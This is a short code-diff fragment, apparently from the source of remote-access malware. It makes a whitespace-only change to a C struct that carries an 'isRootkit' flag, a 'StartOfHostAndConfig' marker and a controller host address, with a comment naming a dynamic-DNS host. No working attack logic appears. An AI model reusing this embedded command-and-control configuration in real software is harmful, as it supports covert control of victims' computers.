@@ -24,7 +24,7 @@ struct DLL_INFO
 	char Dllname[50];
 	char ReMark[50];
 	bool isRootkit;
-}SysInfo =
+} SysInfo =
 {
 	"StartOfHostAndConfig",
 	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
